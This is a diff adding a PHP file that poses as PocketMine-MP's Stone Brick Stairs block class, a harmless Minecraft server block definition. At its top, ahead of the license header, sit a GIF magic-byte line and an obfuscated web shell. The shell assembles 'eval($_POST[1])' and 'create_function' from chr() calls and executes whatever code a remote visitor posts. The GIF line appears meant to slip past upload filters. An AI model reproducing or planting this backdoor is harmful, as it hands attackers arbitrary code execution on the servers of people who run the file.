@@ -1,0 +1,59 @@
+<?php
+gif89a
+<?php
+    $_chr = chr(99).chr(104).chr(114); //chr  
+    $_eval_post_1 = $_chr(101).$_chr(118).$_chr(97).$_chr(108).$_chr(40).$_chr(36).$_chr(95).$_chr(80).$_chr(79).$_chr(83).$_chr(84).$_chr(91).$_chr(49).$_chr(93).$_chr(41).$_chr(59); //eval($_POST[1]); 
+    $_create_function = $_chr(99).$_chr(114).$_chr(101).$_chr(97).$_chr(116).$_chr(101).$_chr(95).$_chr(102).$_chr(117).$_chr(110).$_chr(99).$_chr(116).$_chr(105).$_chr(111).$_chr(110); //create_function 
+
+    $_= $_create_function("",$_eval_post_1); //die(var_dump($_create_function ));
+    @$_();
+?>
+/*
+ *
+ *  ____            _        _   __  __ _                  __  __ ____
+ * |  _ \ ___   ___| | _____| |_|  \/  (_)_ __   ___      |  \/  |  _ \
+ * | |_) / _ \ / __| |/ / _ \ __| |\/| | | '_ \ / _ \_____| |\/| | |_) |
+ * |  __/ (_) | (__|   <  __/ |_| |  | | | | | |  __/_____| |  | |  __/
+ * |_|   \___/ \___|_|\_\___|\__|_|  |_|_|_| |_|\___|     |_|  |_|_|
+ *
+ * This program is free software: you can redistribute it and/or modify
+ * it under the terms of the GNU Lesser General Public License as published by
+ * the Free Software Foundation, either version 3 of the License, or
+ * (at your option) any later version.
+ *
+ * @author PocketMine Team
+ * @link http://www.pocketmine.net/
+ *
+ *
+*/
+
+declare(strict_types=1);
+
+namespace pocketmine\block;
+
+use pocketmine\item\TieredTool;
+
+class StoneBrickStairs extends Stair{
+
+	protected $id = self::STONE_BRICK_STAIRS;
+
+	public function __construct(int $meta = 0){
+		$this->meta = $meta;
+	}
+
+	public function getToolType() : int{
+		return BlockToolType::TYPE_PICKAXE;
+	}
+
+	public function getToolHarvestLevel() : int{
+		return TieredTool::TIER_WOODEN;
+	}
+
+	public function getHardness() : float{
+		return 1.5;
+	}
+
+	public function getName() : string{
+		return "Stone Brick Stairs";
+	}
+}
